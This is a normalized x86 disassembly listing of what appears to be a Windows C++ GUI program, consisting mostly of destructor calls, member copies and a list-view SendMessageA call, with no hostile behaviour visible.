mov [ esp + 0x270 ] 0x63
call sub_442148
lea ecx [ esp + 0x1d0 ]
mov [ esp + 0x270 ] 0x62
call sub_442148
lea ecx [ esp + 0x1cc ]
mov [ esp + 0x270 ] 0x61
call sub_442148
lea ecx [ esp + 0x1c8 ]
mov [ esp + 0x270 ] 0x60
call sub_442148
lea ecx [ esp + 0x1c4 ]
mov [ esp + 0x270 ] 0x5f
call sub_442148
lea ecx [ esp + 0x1c0 ]
mov [ esp + 0x270 ] 0x5e
call sub_442148
lea ecx [ esp + 0x1bc ]
mov [ esp + 0x270 ] 0x5d
call sub_442148
lea ecx [ esp + 0x1b8 ]
mov [ esp + 0x270 ] 0x5c
call sub_442148
lea ecx [ esp + 0x1b4 ]
mov [ esp + 0x270 ] 0x5b
call sub_442148
lea ecx [ esp + 0x1b0 ]
mov [ esp + 0x270 ] 0x5a
call sub_442148
lea ecx [ esp + 0x1ac ]
mov [ esp + 0x270 ] 0x59
call sub_442148
lea ecx [ esp + 0x1a8 ]
mov [ esp + 0x270 ] 0x58
call sub_442148
lea ecx [ esp + 0x1a4 ]
mov [ esp + 0x270 ] 0x57
call sub_442148
lea ecx [ esp + 0x1a0 ]
mov [ esp + 0x270 ] 0x56
call sub_442148
lea ecx [ esp + 0x19c ]
mov [ esp + 0x270 ] 0x55
call sub_442148
lea ecx [ esp + 0x198 ]
mov [ esp + 0x270 ] 0x54
call sub_442148
lea ecx [ esp + 0x194 ]
mov [ esp + 0x270 ] 0x53
call sub_442148
lea ecx [ esp + 0x190 ]
mov [ esp + 0x270 ] 0x52
call sub_442148
lea ecx [ esp + 0x18c ]
mov [ esp + 0x270 ] 0x51
call sub_442148
lea ecx [ esp + 0x188 ]
mov [ esp + 0x270 ] 0x50
call sub_442148
lea ecx [ esp + 0x184 ]
mov [ esp + 0x270 ] 0x4f
call sub_442148
lea ecx [ esp + 0x180 ]
mov [ esp + 0x270 ] 0x4e
call sub_442148
lea ecx [ esp + 0x17c ]
mov [ esp + 0x270 ] 0x4d
call sub_442148
lea ecx [ esp + 0x178 ]
mov [ esp + 0x270 ] 0x4c
call sub_442148
lea ecx [ esp + 0x168 ]
mov [ esp + 0x270 ] 0x4b
call sub_442148
lea ecx [ esp + 0x164 ]
mov [ esp + 0x270 ] 0x4a
call sub_442148
lea ecx [ esp + 0x160 ]
mov [ esp + 0x270 ] 0x49
call sub_442148
lea ecx [ esp + 0x15c ]
mov [ esp + 0x270 ] 0x48
call sub_442148
lea ecx [ esp + 0x120 ]
mov [ esp + 0x270 ] 0x47
call sub_44f0ac
lea ecx [ esp + 0xe4 ]
mov [ esp + 0x270 ] 0x46
call sub_44f0ac
lea ecx [ esp + 0xa8 ]
mov [ esp + 0x270 ] 0x45
call sub_44f0ac
mov [ esp + 0x270 ] 0x44
mov eax [ esi + 0x158 ]
lea edi [ esi + 0x158 ]
push 0x0
push 0x0
push 0xffffffff
mov ecx edi
call [ eax + 0xc ]
test eax eax
jne r-xdata
mov edx [ edi ]
mov ecx edi
call [ edx + 0x20 ]
lea eax [ esp + 0x15c ]
lea ecx [ esi + 0x270 ]
push eax
call sub_442281
lea ecx [ esp + 0x160 ]
push ecx
lea ecx [ esi + 0x2a0 ]
call sub_442281
lea edx [ esp + 0x164 ]
lea ecx [ esi + 0x274 ]
push edx
call sub_442281
lea eax [ esp + 0x168 ]
lea ecx [ esi + 0x2ac ]
push eax
call sub_442281
mov ecx [ esp + 0x16c ]
mov edx [ esp + 0x170 ]
mov eax [ esp + 0x174 ]
mov [ esi + 0x29c ] ecx
lea ecx [ esp + 0x178 ]
mov [ esi + 0x290 ] edx
push ecx
lea ecx [ esi + 0x298 ]
mov [ esi + 0x294 ] eax
call sub_442281
lea edx [ esp + 0x17c ]
lea ecx [ esi + 0x2d8 ]
push edx
call sub_442281
lea eax [ esp + 0x180 ]
lea ecx [ esi + 0x2dc ]
push eax
call sub_442281
lea ecx [ esp + 0x184 ]
lea ebp [ esi + 0x2e0 ]
push ecx
mov ecx ebp
call sub_442281
lea edx [ esp + 0x188 ]
lea ecx [ esi + 0x2e4 ]
push edx
call sub_442281
lea eax [ esp + 0x18c ]
lea ecx [ esi + 0x2e8 ]
push eax
call sub_442281
lea ecx [ esp + 0x190 ]
push ecx
mov ecx ebp
call sub_442281
lea edx [ esp + 0x194 ]
lea ecx [ esi + 0x2b0 ]
push edx
call sub_442281
lea eax [ esp + 0x198 ]
lea ecx [ esi + 0x284 ]
push eax
call sub_442281
lea ecx [ esp + 0x19c ]
push ecx
lea ecx [ esi + 0x278 ]
call sub_442281
lea edx [ esp + 0x1a0 ]
lea ecx [ esi + 0x2a4 ]
push edx
call sub_442281
lea eax [ esp + 0x1a4 ]
lea ecx [ esi + 0x2c0 ]
push eax
call sub_442281
lea ecx [ esp + 0x1a8 ]
push ecx
lea ecx [ esi + 0x2c4 ]
call sub_442281
lea edx [ esp + 0x1ac ]
lea ecx [ esi + 0x2c8 ]
push edx
call sub_442281
lea eax [ esp + 0x1b0 ]
lea ecx [ esi + 0x28c ]
push eax
call sub_442281
lea ecx [ esp + 0x1b4 ]
push ecx
lea ecx [ esi + 0x280 ]
call sub_442281
lea edx [ esp + 0x1b8 ]
lea ecx [ esi + 0x288 ]
push edx
call sub_442281
lea eax [ esp + 0x1bc ]
lea ecx [ esi + 0x340 ]
push eax
call sub_442281
lea ecx [ esp + 0x1c0 ]
push ecx
lea ecx [ esi + 0x344 ]
call sub_442281
lea edx [ esp + 0x1c4 ]
lea ecx [ esi + 0x348 ]
push edx
call sub_442281
lea eax [ esp + 0x1c8 ]
lea ecx [ esi + 0x34c ]
push eax
call sub_442281
lea ecx [ esp + 0x1cc ]
push ecx
lea ecx [ esi + 0x350 ]
call sub_442281
lea edx [ esp + 0x1d0 ]
lea ecx [ esi + 0x354 ]
push edx
call sub_442281
lea eax [ esp + 0x1d4 ]
lea ecx [ esi + 0x328 ]
push eax
call sub_442281
lea ecx [ esp + 0x1d8 ]
push ecx
lea ecx [ esi + 0x32c ]
call sub_442281
lea edx [ esp + 0x1dc ]
lea ecx [ esi + 0x330 ]
push edx
call sub_442281
lea eax [ esp + 0x1e0 ]
lea ecx [ esi + 0x334 ]
push eax
call sub_442281
lea ecx [ esp + 0x1e4 ]
push ecx
lea ecx [ esi + 0x338 ]
call sub_442281
lea edx [ esp + 0x1e8 ]
lea ecx [ esi + 0x33c ]
push edx
call sub_442281
lea eax [ esp + 0x1ec ]
lea ecx [ esi + 0x2f0 ]
push eax
call sub_442281
lea ecx [ esp + 0x1f0 ]
push ecx
lea ecx [ esi + 0x2f4 ]
call sub_442281
lea edx [ esp + 0x1f4 ]
lea ecx [ esi + 0x2f8 ]
push edx
call sub_442281
lea eax [ esp + 0x1f8 ]
lea ecx [ esi + 0x27c ]
push eax
call sub_442281
lea ecx [ esp + 0x1fc ]
push ecx
lea ecx [ esi + 0x2cc ]
call sub_442281
lea edx [ esp + 0x200 ]
lea ecx [ esi + 0x2d0 ]
push edx
call sub_442281
lea eax [ esp + 0x204 ]
lea ecx [ esi + 0x2d4 ]
push eax
call sub_442281
lea ecx [ esp + 0x208 ]
push ecx
lea ecx [ esi + 0x2a8 ]
call sub_442281
lea edx [ esp + 0x20c ]
lea ecx [ esi + 0x2b4 ]
push edx
call sub_442281
lea eax [ esp + 0x210 ]
lea ecx [ esi + 0x2b8 ]
push eax
call sub_442281
lea ecx [ esp + 0x214 ]
push ecx
lea ecx [ esi + 0x2bc ]
call sub_442281
lea edx [ esp + 0x218 ]
lea ecx [ esi + 0x358 ]
push edx
call sub_442281
lea eax [ esp + 0x21c ]
lea ecx [ esi + 0x35c ]
push eax
call sub_442281
lea ecx [ esp + 0x220 ]
push ecx
lea ecx [ esi + 0x360 ]
call sub_442281
lea edx [ esp + 0x224 ]
lea ecx [ esi + 0x364 ]
push edx
call sub_442281
lea eax [ esp + 0x228 ]
lea ecx [ esi + 0x368 ]
push eax
call sub_442281
lea ecx [ esp + 0x22c ]
push ecx
lea ecx [ esi + 0x36c ]
call sub_442281
lea edx [ esp + 0x230 ]
lea ecx [ esi + 0x2fc ]
push edx
call sub_442281
lea eax [ esp + 0x234 ]
lea ecx [ esi + 0x320 ]
push eax
call sub_442281
lea ecx [ esp + 0x238 ]
push ecx
lea ecx [ esi + 0x300 ]
call sub_442281
lea edx [ esp + 0x23c ]
lea ecx [ esi + 0x304 ]
push edx
call sub_442281
lea eax [ esp + 0x240 ]
lea ecx [ esi + 0x308 ]
push eax
call sub_442281
lea ecx [ esp + 0x244 ]
push ecx
lea ecx [ esi + 0x30c ]
call sub_442281
lea edx [ esp + 0x248 ]
lea ecx [ esi + 0x310 ]
push edx
call sub_442281
lea eax [ esp + 0x24c ]
lea ecx [ esi + 0x314 ]
push eax
call sub_442281
lea ecx [ esp + 0x250 ]
push ecx
lea ecx [ esi + 0x318 ]
call sub_442281
lea edx [ esp + 0x254 ]
lea ecx [ esi + 0x31c ]
push edx
call sub_442281
lea eax [ esp + 0x258 ]
lea ecx [ esi + 0x268 ]
push eax
call sub_442281
lea ecx [ esp + 0x25c ]
push ecx
lea ecx [ esi + 0x26c ]
call sub_442281
mov edx [ edi ]
mov ecx edi
call [ edx + 0x28 ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x10 ]
push rw-data
lea ecx [ esp + 0x10 ]
call sub_4421b6
push ecx
lea edx [ esp + 0x10 ]
mov ecx esp
mov [ esp + 0x268 ] esp
push edx
mov [ esp + 0x278 ] 0x43
call sub_441ebd
mov ecx esi
call sub_41c040
lea ecx [ esp + 0xc ]
mov [ esp + 0x270 ] 0x0
call sub_442148
push eax
push eax
push rw-data
call sub_4496b7
lea ecx [ esp + 0x25c ]
mov [ esp + 0x270 ] 0x42
call sub_442148
lea ecx [ esp + 0x258 ]
mov [ esp + 0x270 ] 0x41
call sub_442148
lea ecx [ esp + 0x254 ]
mov [ esp + 0x270 ] 0x40
call sub_442148
mov [ esp + 0x270 ] 0x3f
lea ecx [ esp + 0x250 ]
call sub_442148
lea ecx [ esp + 0x24c ]
mov [ esp + 0x270 ] 0x3e
call sub_442148
lea ecx [ esp + 0x248 ]
mov [ esp + 0x270 ] 0x3d
call sub_442148
lea ecx [ esp + 0x244 ]
mov [ esp + 0x270 ] 0x3c
call sub_442148
lea ecx [ esp + 0x240 ]
mov [ esp + 0x270 ] 0x3b
call sub_442148
lea ecx [ esp + 0x23c ]
mov [ esp + 0x270 ] 0x3a
call sub_442148
lea ecx [ esp + 0x238 ]
mov [ esp + 0x270 ] 0x39
call sub_442148
lea ecx [ esp + 0x234 ]
mov [ esp + 0x270 ] 0x38
call sub_442148
lea ecx [ esp + 0x230 ]
mov [ esp + 0x270 ] 0x37
call sub_442148
lea ecx [ esp + 0x22c ]
mov [ esp + 0x270 ] 0x36
call sub_442148
lea ecx [ esp + 0x228 ]
mov [ esp + 0x270 ] 0x35
call sub_442148
lea ecx [ esp + 0x224 ]
mov [ esp + 0x270 ] 0x34
call sub_442148
lea ecx [ esp + 0x220 ]
mov [ esp + 0x270 ] 0x33
call sub_442148
lea ecx [ esp + 0x21c ]
mov [ esp + 0x270 ] 0x32
call sub_442148
lea ecx [ esp + 0x218 ]
mov [ esp + 0x270 ] 0x31
call sub_442148
lea ecx [ esp + 0x214 ]
mov [ esp + 0x270 ] 0x30
call sub_442148
lea ecx [ esp + 0x210 ]
mov [ esp + 0x270 ] 0x2f
call sub_442148
lea ecx [ esp + 0x20c ]
mov [ esp + 0x270 ] 0x2e
call sub_442148
lea ecx [ esp + 0x208 ]
mov [ esp + 0x270 ] 0x2d
call sub_442148
lea ecx [ esp + 0x204 ]
mov [ esp + 0x270 ] 0x2c
call sub_442148
lea ecx [ esp + 0x200 ]
mov [ esp + 0x270 ] 0x2b
call sub_442148
lea ecx [ esp + 0x1fc ]
mov [ esp + 0x270 ] 0x2a
call sub_442148
lea ecx [ esp + 0x1f8 ]
mov [ esp + 0x270 ] 0x29
call sub_442148
lea ecx [ esp + 0x1f4 ]
mov [ esp + 0x270 ] 0x28
call sub_442148
lea ecx [ esp + 0x1f0 ]
mov [ esp + 0x270 ] 0x27
call sub_442148
lea ecx [ esp + 0x1ec ]
mov [ esp + 0x270 ] 0x26
call sub_442148
lea ecx [ esp + 0x1e8 ]
mov [ esp + 0x270 ] 0x25
call sub_442148
mov [ esp + 0x270 ] 0x24
lea ecx [ esp + 0x1e4 ]
call sub_442148
lea ecx [ esp + 0x1e0 ]
mov [ esp + 0x270 ] 0x23
call sub_442148
lea ecx [ esp + 0x1dc ]
mov [ esp + 0x270 ] 0x22
call sub_442148
lea ecx [ esp + 0x1d8 ]
mov [ esp + 0x270 ] 0x21
call sub_442148
lea ecx [ esp + 0x1d4 ]
mov [ esp + 0x270 ] 0x20
call sub_442148
lea ecx [ esp + 0x1d0 ]
mov [ esp + 0x270 ] 0x1f
call sub_442148
lea ecx [ esp + 0x1cc ]
mov [ esp + 0x270 ] 0x1e
call sub_442148
lea ecx [ esp + 0x1c8 ]
mov [ esp + 0x270 ] 0x1d
call sub_442148
lea ecx [ esp + 0x1c4 ]
mov [ esp + 0x270 ] 0x1c
call sub_442148
lea ecx [ esp + 0x1c0 ]
mov [ esp + 0x270 ] 0x1b
call sub_442148
lea ecx [ esp + 0x1bc ]
mov [ esp + 0x270 ] 0x1a
call sub_442148
lea ecx [ esp + 0x1b8 ]
mov [ esp + 0x270 ] 0x19
call sub_442148
lea ecx [ esp + 0x1b4 ]
mov [ esp + 0x270 ] 0x18
call sub_442148
lea ecx [ esp + 0x1b0 ]
mov [ esp + 0x270 ] 0x17
call sub_442148
lea ecx [ esp + 0x1ac ]
mov [ esp + 0x270 ] 0x16
call sub_442148
lea ecx [ esp + 0x1a8 ]
mov [ esp + 0x270 ] 0x15
call sub_442148
lea ecx [ esp + 0x1a4 ]
mov [ esp + 0x270 ] 0x14
call sub_442148
lea ecx [ esp + 0x1a0 ]
mov [ esp + 0x270 ] 0x13
call sub_442148
lea ecx [ esp + 0x19c ]
mov [ esp + 0x270 ] 0x12
call sub_442148
lea ecx [ esp + 0x198 ]
mov [ esp + 0x270 ] 0x11
call sub_442148
lea ecx [ esp + 0x194 ]
mov [ esp + 0x270 ] 0x10
call sub_442148
lea ecx [ esp + 0x190 ]
mov [ esp + 0x270 ] 0xf
call sub_442148
lea ecx [ esp + 0x18c ]
mov [ esp + 0x270 ] 0xe
call sub_442148
lea ecx [ esp + 0x188 ]
mov [ esp + 0x270 ] 0xd
call sub_442148
lea ecx [ esp + 0x184 ]
mov [ esp + 0x270 ] 0xc
call sub_442148
lea ecx [ esp + 0x180 ]
mov [ esp + 0x270 ] 0xb
call sub_442148
lea ecx [ esp + 0x17c ]
mov [ esp + 0x270 ] 0xa
call sub_442148
mov [ esp + 0x270 ] 0x9
lea ecx [ esp + 0x178 ]
call sub_442148
lea ecx [ esp + 0x168 ]
mov [ esp + 0x270 ] 0x8
call sub_442148
lea ecx [ esp + 0x164 ]
mov [ esp + 0x270 ] 0x7
call sub_442148
lea ecx [ esp + 0x160 ]
mov [ esp + 0x270 ] 0x6
call sub_442148
lea ecx [ esp + 0x15c ]
mov [ esp + 0x270 ] 0x5
call sub_442148
lea ecx [ esp + 0x120 ]
mov [ esp + 0x270 ] 0x4
call sub_44f0ac
lea ecx [ esp + 0xe4 ]
mov [ esp + 0x270 ] 0x3
call sub_44f0ac
lea ecx [ esp + 0xa8 ]
mov [ esp + 0x270 ] 0x2
call sub_44f0ac
mov [ esp + 0x270 ] 0x1
jmp r-xdata
lea ecx [ esp + 0x6c ]
call sub_44f153
lea ecx [ esp + 0x10 ]
mov [ esp + 0x270 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x268 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebp
add esp 0x268
retn
sub_41a1f0
push 0xffffffff
push sub_461993
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0x24c ]
mov [ esp + 0x10 ] 0x41
call sub_442148
lea ecx [ esi + 0x248 ]
mov [ esp + 0x10 ] 0x40
call sub_442148
lea ecx [ esi + 0x244 ]
mov [ esp + 0x10 ] 0x3f
call sub_442148
lea ecx [ esi + 0x240 ]
mov [ esp + 0x10 ] 0x3e
call sub_442148
lea ecx [ esi + 0x23c ]
mov [ esp + 0x10 ] 0x3d
call sub_442148
lea ecx [ esi + 0x238 ]
mov [ esp + 0x10 ] 0x3c
call sub_442148
lea ecx [ esi + 0x234 ]
mov [ esp + 0x10 ] 0x3b
call sub_442148
lea ecx [ esi + 0x230 ]
mov [ esp + 0x10 ] 0x3a
call sub_442148
lea ecx [ esi + 0x22c ]
mov [ esp + 0x10 ] 0x39
call sub_442148
lea ecx [ esi + 0x228 ]
mov [ esp + 0x10 ] 0x38
call sub_442148
lea ecx [ esi + 0x224 ]
mov [ esp + 0x10 ] 0x37
call sub_442148
lea ecx [ esi + 0x220 ]
mov [ esp + 0x10 ] 0x36
call sub_442148
lea ecx [ esi + 0x21c ]
mov [ esp + 0x10 ] 0x35
call sub_442148
lea ecx [ esi + 0x218 ]
mov [ esp + 0x10 ] 0x34
call sub_442148
lea ecx [ esi + 0x214 ]
mov [ esp + 0x10 ] 0x33
call sub_442148
lea ecx [ esi + 0x210 ]
mov [ esp + 0x10 ] 0x32
call sub_442148
lea ecx [ esi + 0x20c ]
mov [ esp + 0x10 ] 0x31
call sub_442148
lea ecx [ esi + 0x208 ]
mov [ esp + 0x10 ] 0x30
call sub_442148
lea ecx [ esi + 0x204 ]
mov [ esp + 0x10 ] 0x2f
call sub_442148
lea ecx [ esi + 0x200 ]
mov [ esp + 0x10 ] 0x2e
call sub_442148
lea ecx [ esi + 0x1fc ]
mov [ esp + 0x10 ] 0x2d
call sub_442148
lea ecx [ esi + 0x1f8 ]
mov [ esp + 0x10 ] 0x2c
call sub_442148
lea ecx [ esi + 0x1f4 ]
mov [ esp + 0x10 ] 0x2b
call sub_442148
lea ecx [ esi + 0x1f0 ]
mov [ esp + 0x10 ] 0x2a
call sub_442148
lea ecx [ esi + 0x1ec ]
mov [ esp + 0x10 ] 0x29
call sub_442148
lea ecx [ esi + 0x1e8 ]
mov [ esp + 0x10 ] 0x28
call sub_442148
lea ecx [ esi + 0x1e4 ]
mov [ esp + 0x10 ] 0x27
call sub_442148
lea ecx [ esi + 0x1e0 ]
mov [ esp + 0x10 ] 0x26
call sub_442148
lea ecx [ esi + 0x1dc ]
mov [ esp + 0x10 ] 0x25
call sub_442148
lea ecx [ esi + 0x1d8 ]
mov [ esp + 0x10 ] 0x24
call sub_442148
lea ecx [ esi + 0x1d4 ]
mov [ esp + 0x10 ] 0x23
call sub_442148
lea ecx [ esi + 0x1d0 ]
mov [ esp + 0x10 ] 0x22
call sub_442148
lea ecx [ esi + 0x1cc ]
mov [ esp + 0x10 ] 0x21
call sub_442148
lea ecx [ esi + 0x1c8 ]
mov [ esp + 0x10 ] 0x20
call sub_442148
lea ecx [ esi + 0x1c4 ]
mov [ esp + 0x10 ] 0x1f
call sub_442148
lea ecx [ esi + 0x1c0 ]
mov [ esp + 0x10 ] 0x1e
call sub_442148
lea ecx [ esi + 0x1bc ]
mov [ esp + 0x10 ] 0x1d
call sub_442148
lea ecx [ esi + 0x1b8 ]
mov [ esp + 0x10 ] 0x1c
call sub_442148
lea ecx [ esi + 0x1b4 ]
mov [ esp + 0x10 ] 0x1b
call sub_442148
lea ecx [ esi + 0x1b0 ]
mov [ esp + 0x10 ] 0x1a
call sub_442148
lea ecx [ esi + 0x1ac ]
mov [ esp + 0x10 ] 0x19
call sub_442148
lea ecx [ esi + 0x1a8 ]
mov [ esp + 0x10 ] 0x18
call sub_442148
lea ecx [ esi + 0x1a4 ]
mov [ esp + 0x10 ] 0x17
call sub_442148
lea ecx [ esi + 0x1a0 ]
mov [ esp + 0x10 ] 0x16
call sub_442148
lea ecx [ esi + 0x19c ]
mov [ esp + 0x10 ] 0x15
call sub_442148
lea ecx [ esi + 0x198 ]
mov [ esp + 0x10 ] 0x14
call sub_442148
lea ecx [ esi + 0x194 ]
mov [ esp + 0x10 ] 0x13
call sub_442148
lea ecx [ esi + 0x190 ]
mov [ esp + 0x10 ] 0x12
call sub_442148
lea ecx [ esi + 0x18c ]
mov [ esp + 0x10 ] 0x11
call sub_442148
lea ecx [ esi + 0x188 ]
mov [ esp + 0x10 ] 0x10
call sub_442148
lea ecx [ esi + 0x184 ]
mov [ esp + 0x10 ] 0xf
call sub_442148
lea ecx [ esi + 0x180 ]
mov [ esp + 0x10 ] 0xe
call sub_442148
lea ecx [ esi + 0x17c ]
mov [ esp + 0x10 ] 0xd
call sub_442148
lea ecx [ esi + 0x178 ]
mov [ esp + 0x10 ] 0xc
call sub_442148
lea ecx [ esi + 0x174 ]
mov [ esp + 0x10 ] 0xb
call sub_442148
lea ecx [ esi + 0x170 ]
mov [ esp + 0x10 ] 0xa
call sub_442148
lea ecx [ esi + 0x16c ]
mov [ esp + 0x10 ] 0x9
call sub_442148
lea ecx [ esi + 0x168 ]
mov [ esp + 0x10 ] 0x8
call sub_442148
lea ecx [ esi + 0x158 ]
mov [ esp + 0x10 ] 0x7
call sub_442148
lea ecx [ esi + 0x154 ]
mov [ esp + 0x10 ] 0x6
call sub_442148
lea ecx [ esi + 0x150 ]
mov [ esp + 0x10 ] 0x5
call sub_442148
lea ecx [ esi + 0x14c ]
mov [ esp + 0x10 ] 0x4
call sub_442148
lea ecx [ esi + 0x110 ]
mov [ esp + 0x10 ] 0x3
call sub_44f0ac
lea ecx [ esi + 0xd4 ]
mov [ esp + 0x10 ] 0x2
call sub_44f0ac
lea ecx [ esi + 0x98 ]
mov [ esp + 0x10 ] 0x1
call sub_44f0ac
lea ecx [ esi + 0x5c ]
mov [ esp + 0x10 ] 0x0
call sub_44f153
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_41a650
push 0xffffffff
push sub_461ed1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x25c
push ebx
push ebp
push esi
mov esi ecx
xor ebx ebx
push edi
push ebx
lea ecx [ esp + 0x18 ]
call sub_41c380
push 0x1
mov ecx esi
mov [ esp + 0x278 ] ebx
call sub_440b18
mov eax [ esi + 0x78 ]
push ebx
push ebx
push 0x1042
push eax
call [ SendMessageA@IAT ]
cmp eax ebx
push ebx
jge r-xdata
lea ecx [ esp + 0x14 ]
push eax
push ecx
lea ecx [ esi + 0x5c ]
call sub_43c1f0
push eax
lea ecx [ esp + 0x260 ]
mov [ esp + 0x278 ] 0x43
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0x274 ] bl
call sub_442148
lea ecx [ esp + 0x14 ]
call sub_43de8a
cmp eax 0x1
jne r-xdata
push ebx
push rw-data
call sub_4496b7
lea ecx [ esp + 0x260 ]
mov [ esp + 0x274 ] 0x42
call sub_442148
lea ecx [ esp + 0x25c ]
mov [ esp + 0x274 ] 0x41
call sub_442148
lea ecx [ esp + 0x258 ]
mov [ esp + 0x274 ] 0x40
call sub_442148
lea ecx [ esp + 0x254 ]
mov [ esp + 0x274 ] 0x3f
call sub_442148
lea ecx [ esp + 0x250 ]
mov [ esp + 0x274 ] 0x3e
call sub_442148
lea ecx [ esp + 0x24c ]
mov [ esp + 0x274 ] 0x3d
call sub_442148
lea ecx [ esp + 0x248 ]
mov [ esp + 0x274 ] 0x3c
call sub_442148
lea ecx [ esp + 0x244 ]
mov [ esp + 0x274 ] 0x3b
call sub_442148
lea ecx [ esp + 0x240 ]
mov [ esp + 0x274 ] 0x3a
call sub_442148
lea ecx [ esp + 0x23c ]
mov [ esp + 0x274 ] 0x39
call sub_442148
lea ecx [ esp + 0x238 ]
mov [ esp + 0x274 ] 0x38
call sub_442148
lea ecx [ esp + 0x234 ]
mov [ esp + 0x274 ] 0x37
call sub_442148
lea ecx [ esp + 0x230 ]
mov [ esp + 0x274 ] 0x36
call sub_442148
lea ecx [ esp + 0x22c ]
mov [ esp + 0x274 ] 0x35
call sub_442148
lea ecx [ esp + 0x228 ]
mov [ esp + 0x274 ] 0x34
call sub_442148
lea ecx [ esp + 0x224 ]
mov [ esp + 0x274 ] 0x33
call sub_442148
lea ecx [ esp + 0x220 ]
mov [ esp + 0x274 ] 0x32
call sub_442148
lea ecx [ esp + 0x21c ]
mov [ esp + 0x274 ] 0x31
call sub_442148
lea ecx [ esp + 0x218 ]
mov [ esp + 0x274 ] 0x30
call sub_442148
lea ecx [ esp + 0x214 ]
mov [ esp + 0x274 ] 0x2f
call sub_442148
lea ecx [ esp + 0x210 ]
mov [ esp + 0x274 ] 0x2e
call sub_442148
lea ecx [ esp + 0x20c ]
mov [ esp + 0x274 ] 0x2d
call sub_442148
lea ecx [ esp + 0x208 ]
mov [ esp + 0x274 ] 0x2c
call sub_442148
lea ecx [ esp + 0x204 ]
mov [ esp + 0x274 ] 0x2b
call sub_442148
lea ecx [ esp + 0x200 ]
mov [ esp + 0x274 ] 0x2a
call sub_442148
lea ecx [ esp + 0x1fc ]
mov [ esp + 0x274 ] 0x29
call sub_442148
lea ecx [ esp + 0x1f8 ]
mov [ esp + 0x274 ] 0x28
call sub_442148
lea ecx [ esp + 0x1f4 ]
mov [ esp + 0x274 ] 0x27
call sub_442148
lea ecx [ esp + 0x1f0 ]
mov [ esp + 0x274 ] 0x26
call sub_442148
lea ecx [ esp + 0x1ec ]
mov [ esp + 0x274 ] 0x25
call sub_442148
lea ecx [ esp + 0x1e8 ]
mov [ esp + 0x274 ] 0x24
call sub_442148
lea ecx [ esp + 0x1e4 ]
mov [ esp + 0x274 ] 0x23
call sub_442148
lea ecx [ esp + 0x1e0 ]
mov [ esp + 0x274 ] 0x22
call sub_442148
lea ecx [ esp + 0x1dc ]
mov [ esp + 0x274 ] 0x21
call sub_442148
lea ecx [ esp + 0x1d8 ]
mov [ esp + 0x274 ] 0x20
call sub_442148
lea ecx [ esp + 0x1d4 ]
mov [ esp + 0x274 ] 0x1f
call sub_442148
lea ecx [ esp + 0x1d0 ]
mov [ esp + 0x274 ] 0x1e
call sub_442148
lea ecx [ esp + 0x1cc ]
mov [ esp + 0x274 ] 0x1d
call sub_442148
lea ecx [ esp + 0x1c8 ]
mov [ esp + 0x274 ] 0x1c
call sub_442148
lea ecx [ esp + 0x1c4 ]
mov [ esp + 0x274 ] 0x1b
call sub_442148
lea ecx [ esp + 0x1c0 ]
mov [ esp + 0x274 ] 0x1a
call sub_442148
lea ecx [ esp + 0x1bc ]
mov [ esp + 0x274 ] 0x19
call sub_442148
lea ecx [ esp + 0x1b8 ]
mov [ esp + 0x274 ] 0x18
call sub_442148
lea ecx [ esp + 0x1b4 ]
mov [ esp + 0x274 ] 0x17
call sub_442148
lea ecx [ esp + 0x1b0 ]
mov [ esp + 0x274 ] 0x16
call sub_442148
lea ecx [ esp + 0x1ac ]
mov [ esp + 0x274 ] 0x15
call sub_442148
lea ecx [ esp + 0x1a8 ]
mov [ esp + 0x274 ] 0x14
call sub_442148
lea ecx [ esp + 0x1a4 ]
mov [ esp + 0x274 ] 0x13
call sub_442148
lea ecx [ esp + 0x1a0 ]
mov [ esp + 0x274 ] 0x12
call sub_442148
lea ecx [ esp + 0x19c ]
mov [ esp + 0x274 ] 0x11
call sub_442148
lea ecx [ esp + 0x198 ]
mov [ esp + 0x274 ] 0x10
call sub_442148
lea ecx [ esp + 0x194 ]
mov [ esp + 0x274 ] 0xf
call sub_442148
lea ecx [ esp + 0x190 ]
mov [ esp + 0x274 ] 0xe
call sub_442148
lea ecx [ esp + 0x18c ]
mov [ esp + 0x274 ] 0xd
call sub_442148
lea ecx [ esp + 0x188 ]
mov [ esp + 0x274 ] 0xc
call sub_442148
lea ecx [ esp + 0x184 ]
mov [ esp + 0x274 ] 0xb
call sub_442148
lea ecx [ esp + 0x180 ]
mov [ esp + 0x274 ] 0xa
call sub_442148
lea ecx [ esp + 0x17c ]
mov [ esp + 0x274 ] 0x9
call sub_442148
lea ecx [ esp + 0x16c ]
mov [ esp + 0x274 ] 0x8
call sub_442148
lea ecx [ esp + 0x168 ]
mov [ esp + 0x274 ] 0x7
call sub_442148
lea ecx [ esp + 0x164 ]
mov [ esp + 0x274 ] 0x6
call sub_442148
lea ecx [ esp + 0x160 ]
mov [ esp + 0x274 ] 0x5
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x274 ] 0x4
call sub_44f0ac
lea ecx [ esp + 0xe8 ]
mov [ esp + 0x274 ] 0x3
call sub_44f0ac
lea ecx [ esp + 0xac ]
mov [ esp + 0x274 ] 0x2
call sub_44f0ac
mov [ esp + 0x274 ] 0x1
jmp r-xdata
lea ecx [ esp + 0x14 ]
mov [ esp + 0x274 ] 0xffffffff
call sub_41a1f0
mov edx [ rw-data ]
mov [ esp + 0x10 ] edx
mov eax [ esp + 0x25c ]
lea ecx [ esp + 0x10 ]
push eax
push rw-data
push ecx
mov [ esp + 0x280 ] 0x44
call sub_43b5cc
mov eax [ esp + 0x1c ]
mov edx [ esi + 0x158 ]
add esp 0xc
lea edi [ esi + 0x158 ]
mov ecx edi
push ebx
push eax
push 0xffffffff
call [ edx + 0xc ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x70 ]
call sub_44f153
lea ecx [ esp + 0x14 ]
mov [ esp + 0x274 ] 0xffffffff
call sub_43da87
jmp r-xdata
mov edx [ edi ]
mov ecx edi
call [ edx + 0x24 ]
lea eax [ esp + 0x160 ]
lea ecx [ esi + 0x270 ]
push eax
call sub_442281
